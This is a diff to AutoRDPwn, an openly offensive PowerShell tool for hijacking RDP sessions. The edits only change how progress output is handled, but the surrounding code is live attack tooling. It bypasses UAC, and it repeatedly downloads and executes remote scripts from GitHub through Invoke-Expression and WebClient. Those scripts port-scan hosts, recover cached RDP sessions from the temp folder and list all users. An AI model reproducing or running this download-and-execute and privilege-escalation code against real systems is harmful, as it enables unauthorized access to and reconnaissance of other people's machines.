@@ -4,7 +4,7 @@ if($OSVersion -like 'Win*'){ Invoke-Expression (New-Object Net.WebClient).Downlo
 if($noadmin -like '-noadmin') { $null } else { if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Bypass-UAC "powershell.exe -sta -NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" $args " ; exit }}
 (New-object System.net.webclient).DownloadFile("https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Design/AutoRDPwn.ico","$pwd\AutoRDPwn.ico") ; (New-object System.net.webclient).DownloadFile("https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Design/Set-ConsoleIcon.ps1","$pwd\Set-ConsoleIcon.ps1") ; .\Set-ConsoleIcon.ps1 AutoRDPwn.ico ; del Set-ConsoleIcon.ps1,AutoRDPwn.ico
 $Host.UI.RawUI.BackgroundColor = 'Black' ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; $Host.PrivateData.ErrorForegroundColor = 'Red' ; $Host.PrivateData.WarningForegroundColor = 'Magenta' ; $Host.PrivateData.DebugForegroundColor = 'Yellow' ; $Host.PrivateData.VerboseForegroundColor = 'Green' ; $Host.PrivateData.ProgressForegroundColor = 'White' ; $Host.PrivateData.ProgressBackgroundColor = 'Blue' }
-$Host.UI.RawUI.WindowTitle = "AutoRDPwn - v5.0 - by @JoelGMSec" ; $ErrorActionPreference = "SilentlyContinue" ; Set-StrictMode -Off ; Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Design/Disable-Close.ps1')
+$Host.UI.RawUI.WindowTitle = "AutoRDPwn - v5.0 - by @JoelGMSec" ; $ErrorActionPreference = "SilentlyContinue" ; $ProgressPreference = "SilentlyContinue" ; Set-StrictMode -Off ; Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Design/Disable-Close.ps1')
 
 function Show-Banner { Clear-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; if($nogui -like '-nogui') { $null } else { 
      Write-Host
@@ -355,12 +355,12 @@ function Remove-Exclusions {
         Write-Host ; $Random = New-Object System.Random ; "[?] $txt8" -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
 
         $Host.UI.RawUI.ForegroundColor = 'Green' ; $networking = $Host.UI.ReadLine() ; Write-Host
-        if($networking -like '1') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 ; Write-Host
+        if($networking -like '1') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 ; Write-Host ; $ProgressPreference = "Continue"
         Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-Portscan.ps1')
         Write-host "[?] $txt55" -NoNewLine -ForegroundColor Gray ; $porthost = $Host.UI.ReadLine() ; Write-Host
         Write-host "[?] $txt56" -NoNewLine -ForegroundColor Gray ; $threads = $Host.UI.ReadLine() ; Write-Host
         Write-host "[?] $txt57" -NoNewLine -ForegroundColor Gray ; $topports = $Host.UI.ReadLine() ; $Host.UI.RawUI.ForegroundColor = 'Blue'
-        Invoke-Portscan -Hosts $porthost -T $threads -TopPorts $topports ;  $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; Write-Progress " " -completed ; Write-Host "[i] " -nonewline ; pause ; Start-Sleep -milliseconds 2000 }
+        Invoke-Portscan -Hosts $porthost -T $threads -TopPorts $topports ;  $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; $ProgressPreference = "SilentlyContinue" ; Write-Host "[i] " -nonewline ; pause ; Start-Sleep -milliseconds 2000 }
 
         if($networking -like '2') { Show-Banner
         Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt14" -ForegroundColor Gray
@@ -406,8 +406,8 @@ function Remove-Exclusions {
         $Host.UI.RawUI.ForegroundColor = 'Green' ; $forensics = $Host.UI.ReadLine() ; Write-Host
 
         if($forensics -like '1') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 ; Write-Host ; Write-Host "[!] $txt19" -ForegroundColor Red ; $Host.UI.RawUI.ForegroundColor = 'Gray'
-        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/RDP-Caching.ps1') ; explorer $env:temp\Recovered_RDP_Session
-        $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; Write-Progress " " -completed ; Write-Host ; Write-Host "[i] " -nonewline ; pause ; Remove-Item -path $env:temp\Recovered_RDP_Session -Recurse -Force ; Start-Sleep -milliseconds 2000 }
+        $ProgressPreference = "Continue" ; Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/RDP-Caching.ps1') ; explorer $env:temp\Recovered_RDP_Session
+        $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; $ProgressPreference = "SilentlyContinue" ; Write-Host ; Write-Host "[i] " -nonewline ; pause ; Remove-Item -path $env:temp\Recovered_RDP_Session -Recurse -Force ; Start-Sleep -milliseconds 2000 }
 
         if($forensics -like '2') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray'
         Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/ListAllUsers.ps1') | Set-Clipboard ; Get-Clipboard
